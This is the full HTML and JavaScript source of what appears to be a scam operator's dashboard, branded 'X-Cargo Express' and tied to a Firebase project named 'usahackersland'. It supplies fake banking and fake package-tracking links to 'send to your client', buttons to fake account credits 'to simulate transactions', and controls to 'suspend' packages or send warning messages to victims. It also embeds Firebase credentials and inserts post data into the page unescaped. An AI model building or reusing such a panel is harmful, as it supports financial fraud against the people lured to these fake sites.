<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard ‚Äî X-Cargo Express</title>
<style>
:root { --em-color:#ff3333; }
body { font-family: Arial,sans-serif; margin:0; padding:20px; background:#000; color:lime; }

/* --- Mobile screen posts --- */
body::before {
  content:""; position:fixed; inset:0; background:#111; opacity:0.4; z-index:0;
}
.top-mobile {
  position:relative; z-index:1;
  width:90%; max-width:1200px; margin:20px auto; border-radius:18px;
  overflow:hidden; box-shadow:0 8px 30px rgba(0,0,0,0.6);
}
.mobile-screen {
  background:#111; color:var(--em-color); padding:16px; height:280px;
  overflow:auto; border:4px solid rgba(255,0,0,0.15);
}
.mobile-header { display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:8px; }
.mobile-title { font-weight:900; font-size:20px; color:var(--em-color); }

.post {
  background:#0b0b0b; border-radius:12px; padding:10px; margin-bottom:10px;
  color:#fff; box-shadow:0 4px 10px rgba(0,0,0,0.6);
}
.post .meta { font-size:12px; color:#9fd89f; margin-bottom:6px; display:flex; justify-content:space-between; gap:8px; align-items:center; }
.post img { max-width:100%; border-radius:8px; margin-top:8px; }
.post .download { display:inline-block; margin-top:8px; padding:8px 12px; border-radius:8px; background:#28a745; color:#fff; text-decoration:none; font-weight:700; }

/* --- Dashboard grid --- */
.dashboard-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:18px; position:relative; z-index:1; }
.dashboard-section { background:#111; border-radius:12px; padding:20px; box-shadow:0 2px 8px rgba(0,0,0,0.4); color:lime; text-align:center; }
.link-box { background:#000; padding:8px; border:1px solid lime; border-radius:6px; margin-bottom:5px; font-size:14px; word-break:break-all; color:lime; }
.link-desc { font-size:13px; color:#adff2f; margin-bottom:8px; text-align:left; }
.btn-lime { background:lime; color:black; padding:10px 12px; border-radius:8px; border:none; cursor:pointer; margin-bottom:6px; }
.btn-green { background:green; color:white; padding:10px 12px; border-radius:8px; border:none; cursor:pointer; margin-bottom:6px; }
.btn-copy { background:#333; color:lime; border:1px solid lime; padding:8px 10px; border-radius:8px; cursor:pointer; margin-bottom:6px; }

/* --- Top-right corner ticker --- */
#cornerTicker {
  position: fixed; top:20px; right:20px; width:350px; max-width:90%;
  height:50px; background: rgba(0,0,0,0.85); color: var(--em-color);
  border:2px solid var(--em-color); border-radius:12px; display:flex; align-items:center;
  z-index: 99999; font-weight:700; font-size:14px; cursor:pointer; box-shadow:0 4px 12px rgba(0,0,0,0.6); overflow:hidden;
}
.siren-flash { width:18px; height:18px; margin:0 4px; border-radius:4px; display:inline-block; vertical-align:middle; }
.siren-flash.left { background:#ff2d2d; animation: flashRed 1s infinite; box-shadow:0 0 8px #ff2d2d; }
.siren-flash.right { background:#1e90ff; animation: flashBlue 1s infinite; box-shadow:0 0 8px #1e90ff; }
@keyframes flashRed {0%,100%{opacity:1}50%{opacity:0.25}}
@keyframes flashBlue {0%,100%{opacity:0.25}50%{opacity:1}}
#cornerTickerInner { display:flex; align-items:center; white-space: nowrap; padding-left:100%; animation: cornerScroll 12s linear infinite; }
#cornerTickerInner img { height:32px; width:32px; object-fit:cover; border-radius:6px; margin-right:6px; }
@keyframes cornerScroll { 0% { transform: translateX(0%); } 100% { transform: translateX(-100%); } }
.hidden { display:none !important; }
</style>
</head>
<body>

<!-- Mobile screen posts -->
<div class="top-mobile">
  <div class="mobile-screen" id="mobileScreen">
    <div class="mobile-header">
      <div class="mobile-title">üì£ Emergency Posts ‚ö°</div>
    </div>
    <div id="postsList">
      <div style="color:#999; text-align:center; padding:30px 0;">Loading posts...</div>
    </div>
  </div>
</div>

<!-- Dashboard -->
<div class="dashboard-grid">

  <div class="dashboard-section">
    <h2>üèõÔ∏è BANK üèß</h2>
    <p class="link-desc">Copy this link and send to your client:</p>
    <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
    <button class="btn-copy" data-copy="bankLink">üìã Copy</button>

    <p class="link-desc">Open account here to register:</p>
    <div class="link-desc">Click to open the registration page to start creating a client account.</div>
    <button class="btn-lime" data-url="https://sp0m.com">Open Account</button>

    <p class="link-desc">Credit your bank account:</p>
    <div class="link-desc">Click this to add credit to your account to simulate transactions.</div>
    <button class="btn-green" data-url="https://bulksms4.github.io/BANKING/create-account.html">üíµüí∞ Credit Account</button>
  </div>

  <div class="dashboard-section">
    <h2>‚úàÔ∏èüö¢ Track Package üõçÔ∏èüõí</h2>
    <p class="link-desc">Copy the link below and send to your client:</p>
    <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
    <button class="btn-copy" data-copy="trackLink">üìã Copy</button>

    <p class="link-desc">Open the account to create packages:</p>
    <div class="link-desc">Creating anything that concerns packages for your client.</div>
    <button class="btn-lime" data-url="https://bulksms4.github.io/x-cargo-exprees/create.html">üì¶ Create Package</button>

    <p class="link-desc">Update the package status:</p>
    <div class="link-desc">Suspend a package or send warning messages to your client package.</div>
    <button class="btn-green" data-url="https://bulksms4.github.io/x-cargo-exprees/update-status.html">‚ö†Ô∏è Update/Suspend</button>
  </div>

</div>

<!-- Top-right corner ticker -->
<div id="cornerTicker" title="Click for emergency link" onclick="if(emergencyLink) window.open(emergencyLink,'_blank')">
  <span class="siren-flash left"></span>
  <div id="cornerTickerInner">Loading emergency messages...</div>
  <span class="siren-flash right"></span>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

<script>
// Firebase init
const firebaseConfig = {
  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain:"usahackersland.firebaseapp.com",
  projectId:"usahackersland",
  storageBucket:"usahackersland.appspot.com",
  messagingSenderId:"588407428267",
  appId:"1:588407428267:web:7c4898cbb62efd3d5953ee"
};
if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const postsList = document.getElementById('postsList');
const cornerTickerInner = document.getElementById('cornerTickerInner');
const cornerTicker = document.getElementById('cornerTicker');
let emergencyLink = '';

// Copy links
document.querySelectorAll('.btn-copy').forEach(btn=>{
  btn.addEventListener('click',()=>{
    const id = btn.getAttribute('data-copy');
    const link = document.getElementById(id).textContent;
    navigator.clipboard.writeText(link).then(()=>alert('Copied!'));
  });
});

// Open URL buttons
document.querySelectorAll('.btn-lime,.btn-green').forEach(btn=>{
  btn.addEventListener('click',()=>{ const url=btn.getAttribute('data-url'); if(url) window.open(url,'_blank'); });
});

// Listen for posts dynamically
db.collection('emergencyPosts').orderBy('createdAt','desc').onSnapshot(snapshot=>{
  postsList.innerHTML='';
  snapshot.forEach(doc=>{
    const data=doc.data();
    const div=document.createElement('div'); div.className='post';
    div.style.border=`2px solid ${data.color||'#ff3333'}`;
    const meta=document.createElement('div'); meta.className='meta';
    meta.innerHTML=`<div>${data.author||'Admin'}</div><div>${new Date(data.createdAt?.seconds*1000||Date.now()).toLocaleString()}</div>`;
    div.appendChild(meta);
    if(data.text){ const p=document.createElement('div'); p.innerText=data.text; div.appendChild(p);}
    if(data.imageURL){ const img=document.createElement('img'); img.src=data.imageURL; div.appendChild(img);}
    if(data.fileURL){ const a=document.createElement('a'); a.href=data.fileURL; a.innerText='‚¨á Download'; a.className='download'; div.appendChild(a);}
    postsList.prepend(div);

    // Update ticker
    cornerTickerInner.innerHTML='';
    if(data.imageURL){ const img=document.createElement('img'); img.src=data.imageURL; cornerTickerInner.appendChild(img);}
    const span=document.createElement('span'); span.textContent=' ‚ö†Ô∏è '+data.text+' ‚ö†Ô∏è ';
    span.style.color=data.color||'#ff3333';
    cornerTickerInner.appendChild(span);
    emergencyLink=data.link||'';
  });
});
</script>
</body>
</html>
